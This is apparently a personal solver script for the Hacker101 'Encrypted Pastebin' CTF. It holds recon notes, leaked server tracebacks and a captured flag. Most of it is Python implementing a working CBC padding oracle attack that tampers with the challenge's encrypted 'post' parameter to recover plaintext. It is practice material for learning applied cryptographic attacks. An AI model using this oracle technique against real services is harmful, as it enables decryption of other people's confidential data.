"""
    CTF Encrypted Pastebin 

    Skills:                 Web, Crypto
    Difficulty (Points):    Hard (9 / flag)
    Number of flags:        4

    https://ctf.hacker101.com/ctf
    
    o Open to clarify
        [ ] tracking.gif (main and result page)
        [ ] Generate own links when encryption key available
        [ ] Create links on one instance and test on new instances
        [ ] Padding oracle for encryption

    o URLs
        o root /
            o POST results (title, body)
                title | body |  result url
                ------------------------------------------------------------------
                Test  | test |  http://35.227.24.107/e636900df0/?post=86dR9YpkvY4YyjthS8KJ0v9nunSwHA9hUZWJtcuH8xF8sKtvanvXJxIG-pXJZeNk6OdKGNKpmAmXqVfEpdLo-QzjZpdLYNUSTaJBLKhdqvcblJHl7sylceHLFikMv!s4V4J2fF9MuEYGcq10mbRduADrPXQRefWuisFCCJUXvEMghBsj3UZUeQWG7XKvh4hNpnjA9kedQIdbzt-02S0wpQ~~
                Test  | test |  http://35.227.24.107/e636900df0/?post=JbDHR18rvB6v7oeUgLwv!DQqK5PrFxT4PJ-g1rUE0LixdmAn6YmWoFspgQBNIN0rJAnC9SNYLZxjnWrcmfDC4na0Dm0h7Vo!TZ7IHS!8N8tu5uzJIeQMefLxlKmsEC6H56sVGJP5skRwnF6ZgzcJ!-2Nvg1XrCwG869UFYNSyvrLNESjnMH0Ygairbk0iR8qk7yZ46C39QWouE!kIFdbgg~~
                Test  | test |  http://35.227.24.107/e636900df0/?post=OJY5vFWceEzXr5i74ExhX1ncvjUUoZ50aRfR9GcoUNAvRKQNaacUREYQ88CLuy-2MfDmepcSATdFEbHnc0TUdRb7JemsM!YtcpcMzFGPBzwRzzogcvI9GS7TYQ2e8-yjzFJX-Nto4slIZeil1RDw8DHSRZwiYcULaNykwR39TwWW8uO7HX0UeO1BxhQXus1i-Du1S1tc6BJAqZnKpsyVDw~~
                Length always 216
            
            o Assumptions: 
                o "post" parameter contains:
                    1. IV - Initialization vector for decryption
                    2. Link to document / JSON-file on the server
                        o Because: Using the link in another instances gives 404 
                        o Because: Using super-large texts is not a problem, so no option to store it in input string with (length = 216)

            o Outcoming error messages when changing url randomly
                1. Using input string with random length:
                    Traceback (most recent call last):
                    File "./main.py", line 69, in index
                        post = json.loads(decryptLink(postCt).decode('utf8'))
                    File "./common.py", line 46, in decryptLink
                        data = b64d(data)
                    File "./common.py", line 11, in <lambda>
                        b64d = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))
                    File "/usr/local/lib/python2.7/base64.py", line 328, in decodestring
                        return binascii.a2b_base64(s)
                    Error: Incorrect padding

                2. Using input string with random length:
                    Traceback (most recent call last):
                    File "./main.py", line 69, in index
                        post = json.loads(decryptLink(postCt).decode('utf8'))
                    File "./common.py", line 48, in decryptLink
                        cipher = AES.new(staticKey, AES.MODE_CBC, iv)
                    File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py", line 95, in new
                        return AESCipher(key, *args, **kwargs)
                    File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/AES.py", line 59, in __init__
                        blockalgo.BlockAlgo.__init__(self, _AES, key, *args, **kwargs)
                    File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py", line 141, in __init__
                        self._cipher = factory.new(key, *args, **kwargs)
                    ValueError: IV must be 16 bytes long 

                3. Using input string with random length:
                    Traceback (most recent call last):
                    File "./main.py", line 69, in index
                        post = json.loads(decryptLink(postCt).decode('utf8'))
                    File "./common.py", line 49, in decryptLink
                        return unpad(cipher.decrypt(data))
                    File "/usr/local/lib/python2.7/site-packages/Crypto/Cipher/blockalgo.py", line 295, in decrypt
                        return self._cipher.decrypt(ciphertext)
                    ValueError: Input strings must be a multiple of 16 in length

                4. Using input string with random length:
                    Traceback (most recent call last):
                    File "./main.py", line 69, in index
                        post = json.loads(decryptLink(postCt).decode('utf8'))
                    File "./common.py", line 49, in decryptLink
                        return unpad(cipher.decrypt(data))
                    File "./common.py", line 22, in unpad
                        raise PaddingException()
                    PaddingException

                5. Using input string on new instance with no created entries:
                    ^FLAG^0a361c37ac67bda537d01bdb4ecdf69e59a522a33fcf8c98ca7c48051f96f777$FLAG$
                    Traceback (most recent call last):
                    File "./main.py", line 72, in index
                        abort(404)
                    File "/usr/local/lib/python2.7/site-packages/werkzeug/exceptions.py", line 707, in abort
                        return _aborter(status, *args, **kwargs)
                    File "/usr/local/lib/python2.7/site-packages/werkzeug/exceptions.py", line 687, in __call__
                        raise self.mapping[code](*args, **kwargs)
                    NotFound: 404 Not Found: The requested URL was not found on the server.  If you entered the URL manually please check your spelling and try again.

                6.  Using old input string on new instance with created entries
                    Attempting to decrypt page with title: sdgfg    =>    Breach: Obtained with link from old instance
                    Traceback (most recent call last):
                    File "./main.py", line 74, in index
                        body = decryptPayload(post['key'], body)
                    File "./common.py", line 37, in decryptPayload
                        return unpad(cipher.decrypt(data))
                    File "./common.py", line 22, in unpad
                        raise PaddingException()
                    PaddingException

                7. 
                    Traceback (most recent call last):
                    File "./main.py", line 69, in index
                        post = json.loads(decryptLink(postCt).decode('utf8'))
                    File "/usr/local/lib/python2.7/encodings/utf_8.py", line 16, in decode
                        return codecs.utf_8_decode(input, errors, True)
                    UnicodeDecodeError: 'utf8' codec can't decode byte 0x8a in position 80: invalid start byte

                8.
                    Traceback (most recent call last):
                    File "./main.py", line 69, in index
                        post = json.loads(decryptLink(postCt).decode('utf8'))
                    File "/usr/local/lib/python2.7/encodings/utf_8.py", line 16, in decode
                        return codecs.utf_8_decode(input, errors, True)
                    UnicodeDecodeError: 'utf8' codec can't decode byte 0xee in position 80: invalid continuation byte

"""

import base64
import binascii
import json
import requests
from tqdm import tqdm
from Crypto.Cipher import AES
from urlparse import urlparse, parse_qs

# Base url of Hacker101 challenge
base_url = "http://35.227.24.107/a33e0e1eeb/"


def unpad(data):
    """Remove padding bytes using PCKS#7"""
    num_padding_bytes = data[-1]

    # Check if data is consistent with PCKS#7
    for i in range(len(data) - num_padding_bytes, len(data)):
        if data[i] is not num_padding_bytes:
            raise Exception("Error occured! Incorrect padding.")

    return data[:-num_padding_bytes]


def str_to_int(val):
    """Nice formatting of integer numbers"""
    return " ".join("{:03}".format(ord(c)) for c in val) 


def str_to_hex(val):
    """Nice formatting of HEX pairs"""
    return " ".join("{:02x}".format(ord(c)) for c in val) 


def str_to_binary(val):
    """Nice formatting in binary octets"""    
    return " ".join("{:08b}".format(ord(c)) for c in val)     


def encode_data(data):
    """Encode data with base64 encoding and replacement"""

    # Encode with B64 
    b64e = lambda x: base64.encodestring(data)
    data_b64e = b64e(data)

    # Replace special keys in the input string
    return data_b64e.replace('=', '~').replace('/', '!').replace('+', '-').replace('\n', '') 


def decode_data(data):
    """Decode data with replacement and base64 encoding"""

    # Replace special keys in the input string
    data_replaced = data.replace('~', '=').replace('!', '/').replace('-', '+') 

    # Decode with B64 
    b64d = lambda x: base64.decodestring(data_replaced)
    return b64d(data_replaced)


def change_byte_at_index(data, index, byte):
    """Set given byte at given index"""
    
    if index >= len(data):
        raise Exception("Error occured! Input string is too short.")

    return data[:index] + chr(byte) + data[index+1:]


def padding_oracle(data, block_size = 16):
    """CBC padding oracle 
    
    For algorithmic details see: https://www.youtube.com/watch?v=aH4DENMN_O4&ab_channel=intrigano     
    """
    
    #################################################################
    # Data preparation
    #################################################################

    # Decode data
    cipher_text = decode_data(data)

    # Split cipher text into blocks    
    len_cipher_text = len(cipher_text)
    cipher_blocks = []
    for i in range(len_cipher_text / block_size):
        cur_block = cipher_text[i * block_size : (i + 1) * block_size]
        cipher_blocks.append(cur_block)


    #################################################################
    # Guess the bytes of each block
    #################################################################

    # By changing the forelast block it's possible to change the last block
    # of the plain text. Here we can pretend to have more padding bytes than exist
    # by changing the already known padding bytes and try to find the 
    # correct byte value for the additional "pretended padding byte". If we
    # achieve to not having a PaddingException() we can infer the actual value
    # of this byte in the last block of the plain text. 

    plain_text = []    

    # Decode block by block beginning at the forelast block and last byte
    for block_id in range(len(cipher_blocks) - 2, -1, -1):
        # Get plain text value of missing bytes
        bytes_guessed = {}
        num_padding_bytes = 0
        for index in range(block_size - num_padding_bytes - 1, -1, -1):

            print("Guessing block {} byte [{}]".format(block_id, index))
            # Pretent to have more padding bytes
            cur_num_padding_bytes = num_padding_bytes + (block_size - num_padding_bytes - index) 
        
            # Change padding-related bytes in forelast block in such way that the same bytes 
            # in the plain text will increment to pretend to have more padding bytes

            # Create copy of original cipher text 
            cipher_blocks_tmp = []
            for i in range( block_id + 2):
                cipher_blocks_tmp.append( cipher_blocks[i] )
                
            for i in range(block_size - cur_num_padding_bytes + 1, block_size):
                # # Check if byte is pretended or an actual padding byte
                if i < block_size - num_padding_bytes:
                    # Handle pretended padding bytes 
                    old_value = bytes_guessed[i][1]
                    padding_bytes = bytes_guessed[i][0]
                    new_value = old_value ^ padding_bytes ^ cur_num_padding_bytes
                else:
                    # Increment actual padding bytes
                    old_value = cipher_blocks_tmp[block_id][i]
                    padding_bytes = num_padding_bytes
                    new_value = ord(old_value) ^ padding_bytes ^ cur_num_padding_bytes

                cipher_blocks_tmp[block_id] = change_byte_at_index(cipher_blocks_tmp[block_id], i, new_value)
            
            # In the next step we find the correct value of the additional pretended padding byte that will not throw PaddingException()
            for value in tqdm(range(256)):
                # print("Check for value {} ...".format(value))

                # Find the value that leads to a valid padding byte value in the last block of plain text
                cipher_blocks_tmp[block_id] = change_byte_at_index(cipher_blocks_tmp[block_id], index, value)

                # Send the changed data to server and check response
                response = evaluate_data( encode_data("".join(cipher_blocks_tmp)) )
            
                # Check if PaddingException() occurs
                if "PaddingException()" not in response.text:
                    print(response.text)
                    # Do the math to get the actual plaintext value by having a valid plain text byte and related IV byte
                    plain_text_value = cur_num_padding_bytes ^ value ^ ord(cipher_blocks[block_id][index])
                    plain_text.insert(0, plain_text_value) 
                    bytes_guessed[index] = (cur_num_padding_bytes, value)
                    print("")
                    print("Success!")
                    print("")
                    print("Plain text (hex) = {}{}".format("?? " * (block_size - len(plain_text)), " ".join("%02x " % x for x in plain_text)))
                    print("Plain text       = {}".format( "".join( chr(x) for x in plain_text)))
                    print("")
                    break        

    # Debug print of cipher blocks
    print("Cipher text blocks:")
    for i, block in enumerate(cipher_blocks):
        # @todo: Print related plaintext to each block
        print("Block[{}]: {} {}".format(i, str_to_hex(block), " <- IV" if (i==0) else ""))            
    print ("")

    pass

# Call  decryptPayload(post['key'], body):
def decryptPayload(key, body):
    """Reverse engineered decrypt function from the server"""

    # @todo: Nothing here yet

    pass

def decryptLink(data):
    """Reverse engineered decrypt function from the server"""

    """
    Except from common.py:
    44  => definition / calculation of IV + staticKey
    45
    46  data = b64d(data)
    47
    48  cipher = AES.new(staticKey, AES.MODE_CBC, iv)
    49  return unpad(cipher.decrypt(data))
    """

    pass

def evaluate_data(data):
    """Send data to the pastebin and retrieve response"""
    payload = { 'post': data }

    response = requests.get(base_url, params=payload)

    if response.status_code == 404:
        raise Exception("Error occurred! URL '{}' is not available ({}).".format(base_url, response.status_code) )
    
    return response

def get_flag_0():
    """Get flag 0 by any invalid input data"""

    data = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
    response = evaluate_data(data[1:])
    print( response.text )

def get_flag_1():
    """Get flag 1 with padding oracle attack"""

    # Run the actual padding oracle attack
    data = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
    padding_oracle(data)

    # Will return {"flag": "^FLAG^xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx$FLAG$", "id": "2", "key": "V!FLXKt9eRXcWBH7D2uSJA~~"}

def create_links_to_file(filename, title, body, count):
    """Create pages and store 'post' parameter to file"""

    with open(filename, 'w') as file: 
        for i in tqdm(range(count)):
            data =  {
                        'title' : title,
                        'body'  : body
                    }

            response = requests.post(base_url, data=data)
            
            # Retrieve GET('post') parameter
            parsed_url = urlparse(response.url)
            params = parse_qs(parsed_url.query)
   
            file.write( "{}\n".format(params['post'][0]) )

def read_links_from_file(filename):
    """Read 'post' parameter from file and evaluate server response"""
    
    # Read posts 
    posts = []
    with open(filename, 'r') as file: 
        posts = file.readlines()

    # Evaluate posts
    with open(filename + ".result", 'w') as file: 
        for post in tqdm(posts):       
            response = evaluate_data(post)        
            file.write("post={}".format(post))
            file.write("\n")
            file.write(response.text) 
            file.write("\n")
            file.write("##################################################################\n")
            file.write("\n")

def test_de_encoding():
    """Test decode and encode functionality"""

    data = "0WrV4QqDqUEgjpuCD4qWul9243BU0!M7HVLV31BSWeFrB4WSNvECLDO1XDbFboV1yZwlcKf0XA2EFACyNLnREYrCZl0rc86w5D4kDba-0qjbG40rDRovD-q0CUJl1BUiEUDCi9cqpRGLLk0bp8nn2V7eX5mZv7RnoxdIrFCtN5lKXBYv1XDI8rfFfpsNedLP-wYI6JllnDQAesiWY04IQA~~"
    dec_data = decode_data(data)
    enc_data = encode_data(dec_data)
    if enc_data != data:
        raise Exception("Error in encoding or decoding function.")

if __name__ == "__main__":

    # Initial tests
    test_de_encoding()

    # Get the flags
    get_flag_0()
    get_flag_1()

    # Testing reuse of codes in new instance
    # filename = 'valid_post_parameter.txt'
    # create_links_to_file(filename, "Title", "Body", 500)
    # read_links_from_file(filename) 